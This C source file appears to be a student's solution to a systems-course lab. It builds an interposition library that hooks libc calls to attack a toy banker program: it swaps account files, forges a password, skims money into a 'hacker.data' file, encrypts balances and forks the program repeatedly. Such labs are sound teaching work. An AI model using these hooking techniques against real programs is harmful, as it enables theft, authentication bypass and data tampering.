#include<stdint.h>
#include<stdio.h>
#include <stdlib.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include<sys/wait.h>

/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2.cpp, so that we don't need an
 * extra header file. */
void so_allocate();
void so_deallocate();
int insert(int fd, const char* name, long balance);
int update(int fd, long balance);
int getFileBalance(int fd);
int erase(int fd);
int findFd();
const char* getFileName(int fd);

static int ignoreMalloc = 0;

__attribute__((destructor))
static void deallocate()
{
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}


//----------------Implementation of Task 2-------------------//
//stores the type of scenario the program will run,
//this is found through interpositioning the first open() command
//everytime the banker is run
static int eventNumber = -1;

//Event Specific Private Global Variables
static int bankAccount1 = -1;
static int bankAccount2 = -1;
static int event4Fd = -1;

static int toggleNormalRead = 0;
static int toggleNormalWrite = 0;
static int toggleNormalOpen = 0;
static int toggleNormalClose = 0;
static int toggleNormalExec = 0;
static int toggleNormalFork = 0;
static int encryptionBankAccount1 = 0;
static int encryptionBankAccount2 = 0;
static int forkCount = -1;
static int execvpDummy = 0;
static int parentId = -1;

//Create the XOR encryption based upon the filename
int getEncryption(const char* filename) {
    int i = 0;
    int encryption = 0;
    while (filename[i] != '\0' && filename[i] != '.') {
        encryption ^= filename[i];
        i++;
    }
    return encryption;
}

//Get the encrypted filename with a .enc extension
void getEncryptedName(const char* filename, char* destination) {
    int i = 0;
    while (filename[i] != '\0' && filename[i] != '.') {
        destination[i] = filename[i];
        i++;
    }
    destination[i] = '.';
    destination[i + 1] = 'e';
    destination[i + 2] = 'n';
    destination[i + 3] = 'c';
    destination[i + 4] = '\0';
    return;
}

//Create encrypted data from the encryption
void toggleEncryption(char* data, int encryption, ssize_t nbytes) {
    int i = 0;
    while (i != nbytes && data[i] != '\0') {
        data[i] ^= encryption;
        i++;
    }
}

//Get the balance from a user account
ssize_t getBalance(int fd, char* balance) {
    return read(fd, balance, 20);
}


//Interposition open()
int open(char *pathname, int flags) {
    int (*fnct)(const char*, int) = NULL;
    fnct = dlsym(RTLD_NEXT, "open");
    if (eventNumber == -1) {
        eventNumber = pathname[0] - '0';
        if (eventNumber == 4 || eventNumber == 6) {
            event4Fd = fnct("hacker.data", 0x0002);
            parentId = getpid();
            return -1;
        }
        else if (eventNumber == 8) {
            toggleNormalFork = 1; //on first call to fork in event 8, needs to execute normally
        }
        return fnct(pathname, flags);
    }
    
    if (eventNumber == 7 && toggleNormalOpen == 0) {
        char name[20] = {};
        getEncryptedName(pathname, name);
        int encryption = getEncryption(pathname);
        int fd = fnct(name, 0x0002);
        if (fd == -1) {
            //Get original data
            int size = strlen(pathname);
            char* oldFile = (char*)malloc((size + 1) * sizeof(char));
            strcpy(oldFile, pathname);
            oldFile[size] = '\0';
            int userFd = fnct(oldFile, 0x002);
            char balance[20] = {};
            
            toggleNormalRead = 1;
            ssize_t nbytes = getBalance(userFd, balance);
            toggleNormalRead = 0;

            balance[nbytes] = '\0';
            close(userFd);
            free(oldFile);
            
            //Create Encrypted data
            toggleEncryption(balance, encryption, nbytes);
            
            //Create and write to new file
            FILE* fptr = fopen(name, "wb");

            toggleNormalWrite = 1;
            fprintf(fptr, "%s", balance);
            toggleNormalWrite = 0;
            fclose(fptr);

            fd = fnct(name, 0x0002);
        }

        if (bankAccount1 == -1 && bankAccount2 == -1) {
            bankAccount1 = 1;
            encryptionBankAccount1 = encryption;
        }
        else if (bankAccount2 == -1) {
             bankAccount2 = 1;
             encryptionBankAccount2 = encryption;
        }
        return fd;
    }
    else if (eventNumber == 3 && toggleNormalOpen == 0) {
        //Get original data
        int size = strlen(pathname);
        char* oldFile = (char*)malloc((size + 1) * sizeof(char));
        strcpy(oldFile, pathname);
        oldFile[size] = '\0';
        int userFd = fnct(oldFile, 0x002);
        char balance[20] = {};

        toggleNormalRead = 1;
        ssize_t nbytes = getBalance(userFd, balance);
        toggleNormalRead = 0;

        balance[nbytes] = '\0';
        int data = atoi(balance);

        toggleNormalClose = 1;
        close(userFd);
        toggleNormalClose = 0;

        free(oldFile);
        int nextFd = findFd(); 
        insert(nextFd, pathname, data);
        return nextFd;
    }
    return fnct(pathname, flags);
}

//Interposition fopen()
FILE* fopen(const char *filename, const char *mode) {
    FILE* (*fnct)(const char*, const char*) = NULL;
    fnct = dlsym(RTLD_NEXT, "fopen");
    if (eventNumber == 2) {
        const char* newfile;
        if (strcmp(filename, "alice.data") == 0) {
            newfile = "bob.data";
        }
        else if (strcmp(filename, "bob.data") == 0) {
            newfile = "alice.data";
        }
        else {
            newfile = filename;
        }
        return fnct(newfile, mode);
    }
    return fnct(filename, mode);
}

//Interposition fscanf
int fscanf(FILE *stream, const char* format, ...) {
    va_list args;
    va_start(args, format);
    //if not the "%ms" signature, then call the regular fscanf
    if (eventNumber == 1) {
        if (strcmp(format, "%ms") == 0) {
            //Otherwise get the address of the password variable,
            //and figure out what data to write to it
            char **output = va_arg(args, char**);
            output[0] = malloc(20 * sizeof(char));
			char* password = malloc(15 * sizeof(char));
			strcpy(password, "turtle");
			strcat(password,getlogin());
			strcpy(output[0],password);
			va_end(args);
            free(password);
            return 1;
        }
        else if (strcmp(format, "%d") == 0) {
            int *output = va_arg(args, int*);
            *output = 125;
            va_end(args);
            return 1;
        }
    }

    int retval = vfscanf(stream, format, args); 
    va_end(args);
    return retval;
}

ssize_t read(int fildes, void *buf, size_t nbytes) {
    ssize_t (*fnct)(int, void*, size_t) = NULL;
    fnct = dlsym(RTLD_NEXT, "read");
    if (eventNumber == 4) {
        //call the real implementation
        ssize_t retval = fnct(fildes, buf, nbytes);
        char *num = buf;
        num[retval] = '\0';
        //store the amount of money for each account
        if (bankAccount1 == -1 && bankAccount2 == -1) {
            bankAccount1 = atoi(num);
        }
        else if (bankAccount2 == -1) {
            bankAccount2 = atoi(num);
        } 
        return retval;
    }
    else if (eventNumber == 7 && toggleNormalRead == 0) {
        char *balance = (char*)buf;
        ssize_t bytesRead = fnct(fildes, buf, nbytes);
        balance[bytesRead] = '\0';
        
        int encryption;
        if (bankAccount1 == 1 && bankAccount2 == 1) {
            encryption = encryptionBankAccount1;
            bankAccount1 = 0;
        }
        else {
            encryption = encryptionBankAccount2;
            bankAccount2 = 0;
        }
        
        toggleEncryption(balance, encryption, bytesRead);
        return bytesRead; 
    }
    else if (eventNumber == 3 && toggleNormalRead == 0) {
        int balance = getFileBalance(fildes); 
        char *data = (char*)buf;
        sprintf(data, "%d", balance);
        return strlen(data);
    }

    return fnct(fildes, buf, nbytes);
}

int getAccountBalance(char* name) {
    int fd = open(name, 0);
    char balance[20] = {};
    int nbytes = read(fd, &balance, 20);
    if (nbytes == -1 || nbytes == 0) {
        close(fd);
        return 0;
    }
    balance[nbytes] = '\0';
    close(fd);
    return atoi(balance);
}

int getMaxAccount() {
    int balances[7] = {};
    balances[0] = getAccountBalance("bob.data");
    balances[1] = getAccountBalance("alice.data");
    balances[2] = getAccountBalance("rick.data");
    balances[3] = getAccountBalance("morty.data");
    balances[4] = getAccountBalance("picard.data");
    balances[5] = getAccountBalance("kirk.data");
    balances[6] = getAccountBalance("student.data");
    int maxval = balances[0];
    int maxidx = 0;
    for (int i = 1; i < 7; i++) {
        if (balances[i] > maxval) {
            maxval = balances[i];
            maxidx = i;
        }
    }
    return maxidx;
}

pid_t getpid(void){
    long int (*fnct)(void);
    fnct = dlsym(RTLD_NEXT, "getpid");
    if (eventNumber == 5) {
        return getMaxAccount() + 1;
    }
    return fnct();
}

long int random(void) {
    long int (*fnct)(void);
    fnct = dlsym(RTLD_NEXT, "random");
    if (eventNumber == 5) {
        return 7;
    }
    else if (eventNumber == 8 && forkCount == -1) {
        long int retval = fnct();
        forkCount = retval % 30 + 10;
        return retval;
    }
    return fnct();
}

//Helper function for getting the hacker bank account value
int getHackerBankAccount() {
    if (event4Fd == -1 || lseek(event4Fd, 0, SEEK_SET) == -1) {
        return -1;
    }
    char num[21];
    int nbytes = read(event4Fd, &num, 20);
    if (nbytes == -1 || nbytes == 0) {
        return 0;
    }
    lseek(event4Fd, 0, SEEK_SET);
    return atoi(num);
}

//Helper function to determine min of two numbers
int min(const int a, const int b) {
    if (a < b) {
        return a;
    }
    return b;
}

//Helper function to write money to hacker account
ssize_t skimToHacker(ssize_t (*writeFunctionPtr)(int, const void*, size_t), int skimAmount) {
    int hackerMoney = getHackerBankAccount();
    char hackerUpdate[21] = {};
    sprintf(hackerUpdate, "%d", hackerMoney + skimAmount);
    int retval = writeFunctionPtr(event4Fd, hackerUpdate, strlen(hackerUpdate));
    lseek(event4Fd, 0, SEEK_SET);
    return retval;
}

//Helepr function to write the new balance to a specified user file
ssize_t writeToUserAccount(ssize_t (*writeFunctionPtr)(int, const void*, size_t), int newAmount, int fildes) {
    char updateUser[20] = {};
    sprintf(updateUser, "%d", newAmount);
    return writeFunctionPtr(fildes, updateUser, strlen(updateUser));
}

//Interpositioning write
ssize_t write(int fildes, const void *buf, size_t nbytes) {
    ssize_t (*fnct)(int, const void*, size_t);
    fnct = dlsym(RTLD_NEXT, "write");
    if (eventNumber == 4) {
        int data = atoi((const char*)buf);
        if (bankAccount1 != -1) {
            //Skim transaction and add to hacker bank account
            int transaction = data - bankAccount1;
            if (transaction > 0) {
                int skimAmount = min(transaction, 4);
                skimToHacker(fnct, skimAmount);
                bankAccount1 = -1;
                return writeToUserAccount(fnct, data - skimAmount, fildes);
            }
            bankAccount1 = -1;
            return fnct(fildes, buf, nbytes);
        }
        else if (bankAccount2 != -1) {
            int transaction = data - bankAccount2;
            if (transaction > 0) {
                int skimAmount = min(transaction, 4);
                skimToHacker(fnct, skimAmount);
                bankAccount2 = -1;
                return writeToUserAccount(fnct, data - skimAmount, fildes);
            }
            bankAccount2 = -1;
            return fnct(fildes, buf, nbytes);
        }
    }
    else if (eventNumber == 7 && toggleNormalWrite == 0) {
        size_t size = strlen((const char*)buf);
        char *balance = (char*)malloc((size + 1) * sizeof(char));
        strcpy(balance, (const char*)buf);
        balance[size] = '\0';

        int encryption;
        if (bankAccount1 == 0 && bankAccount2 == 0) {
            encryption = encryptionBankAccount1;
            bankAccount1 = -1;
        }
        else {
            encryption = encryptionBankAccount2;
            bankAccount2 = -1;
        }
        
        toggleEncryption(balance, encryption, size);
        ssize_t retval = fnct(fildes, balance, size);
        free(balance);
        return retval;
    }
    else if (eventNumber == 3 && toggleNormalWrite == 0) {
        int data = atoi((const char*)(buf)); 
        update(fildes, data);
        return strlen((const char*)buf);
    }
    else if (eventNumber == 6 && toggleNormalWrite == 0) {
        int *temp = (int*) buf;
        if (parentId == getpid() && *temp > 0) {
            int skimAmount = min(*temp, 2);
            int val = *temp - skimAmount;
            fnct(20, &skimAmount, nbytes);
            return fnct(fildes, &val, nbytes);
        }
    }
    return fnct(fildes, buf, nbytes);
}

int close(int fd) {
    int (*fnct)(int);
    fnct = dlsym(RTLD_NEXT, "close");
    if (eventNumber == 3 && toggleNormalClose == 0) {
        FILE* file = fopen(getFileName(fd), "w");
        fprintf(file, "%d", getFileBalance(fd));
        fclose(file);
        erase(fd);
        return 0;
    }
    return fnct(fd);
}

off_t lseek(int fd, off_t offset, int whence) {
    if (eventNumber == 3) {
        return offset;
    }
    off_t (*fnct)(int, off_t, int);
    fnct = dlsym(RTLD_NEXT, "lseek");
    return fnct(fd, offset, whence);
}

int ftruncate(int fd, off_t length) {
    if (eventNumber == 3) {
        return 0;
    }
    int (*fnct)(int, off_t);
    fnct = dlsym(RTLD_NEXT, "ftruncate");
    return fnct(fd, length);
}

pid_t fork(void) {
    pid_t (*fnct)(void);
    fnct = dlsym(RTLD_NEXT, "fork");
    if (eventNumber == 8) {
        if (toggleNormalFork == 1) {
            toggleNormalFork = 0;
            return fnct();
        }
        execvpDummy = 1;
    }
    return fnct();
}

int execvp(const char *file, char *const *args) {
    int (*fnct)(const char*, char* const*);
    fnct = dlsym(RTLD_NEXT, "execvp");
    if (execvpDummy == 1) {
        exit(0);
    }
    else if (eventNumber == 8) {
        eventNumber = -1; //call fork normally
        for (int i = forkCount; i > 0; i--) {
            if (fork() == 0) {
                execvp(file, args);
                exit(1); //failure if execvp returns
            }
            wait(NULL);
        }
        eventNumber = 8; //return to normal eventNumber
        exit(0);
    }
    return fnct(file, args);
}
